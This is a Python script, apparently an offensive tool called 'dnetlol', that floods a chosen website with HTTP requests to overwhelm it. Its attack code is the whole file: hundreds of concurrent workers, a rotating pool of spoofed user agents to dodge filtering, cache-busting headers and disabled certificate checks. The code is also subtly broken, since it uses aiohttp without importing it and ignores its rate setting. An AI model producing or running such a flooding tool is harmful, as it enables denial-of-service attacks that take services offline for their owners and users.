# dnetlol.py - shadow-9 http cannon 2026 edition
import asyncio
import random
import ssl
import time
from urllib.parse import urlparse
import argparse

ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Edg/131.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.98 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.98 Mobile Safari/537.36",
    "curl/8.10.1",
    "python-requests/2.32.3",
    "axios/1.7.7",
    "got/14.4.2",
    "node-fetch/3.3.2",
]

async def flood_worker(target, port, path, duration, rate, sem):
    connector = None
    if port == 443:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(ssl=ssl_context, limit=0, force_close=False)
    else:
        connector = aiohttp.TCPConnector(limit=0, force_close=False)

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"Connection": "keep-alive"},
        timeout=aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=15)
    ) as session:
        start = time.time()
        req_count = 0

        while time.time() - start < duration:
            try:
                async with sem:
                    ua = random.choice(ua_list)
                    headers = {
                        "User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "Upgrade-Insecure-Requests": "1",
                    }

                    async with session.get(
                        f"{target}:{port}{path}",
                        headers=headers,
                        allow_redirects=False,
                        timeout=10
                    ) as resp:
                        req_count += 1
                        # drain just enough to keep connection alive
                        await resp.content.read(4096)
                        await asyncio.sleep(0.01)  # tiny backoff to not kill our own sockets

            except (aiohttp.ClientError, asyncio.TimeoutError, ConnectionResetError, OSError):
                pass  # expected in heavy flood

            except Exception as e:
                print(f"worker exception: {e}")
                await asyncio.sleep(0.3)

    print(f"worker done → {req_count} reqs")

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="http:// or https:// target (no trailing /)")
    parser.add_argument("--path", default="/", help="path to hammer (default /)")
    parser.add_argument("--duration", type=int, default=300, help="seconds to run")
    parser.add_argument("--concurrency", type=int, default=600, help="concurrent connections")
    parser.add_argument("--rate", type=int, default=0, help="requests per sec per connection (0 = unlimited)")
    args = parser.parse_args()

    parsed = urlparse(args.target)
    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = args.path if args.path.startswith("/") else "/" + args.path

    target = f"{scheme}://{host}"

    print(f"╭───────────────────────────────╮")
    print(f"│       D N E T L O L           │")
    print(f"│  shadow-9 http flood 2026     │")
    print(f"╰───────────────────────────────╯")
    print(f"target   → {target}:{port}")
    print(f"path     → {path}")
    print(f"time     → {args.duration}s")
    print(f"workers  → {args.concurrency}")
    print(f"ua pool  → {len(ua_list)}")

    sem = asyncio.Semaphore(args.concurrency)

    tasks = []
    for _ in range(args.concurrency):
        tasks.append(asyncio.create_task(flood_worker(target, port, path, args.duration, args.rate, sem)))

    await asyncio.gather(*tasks, return_exceptions=True)

    print("\ndnetlol finished.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nctrl+c → dnetlol stopped")
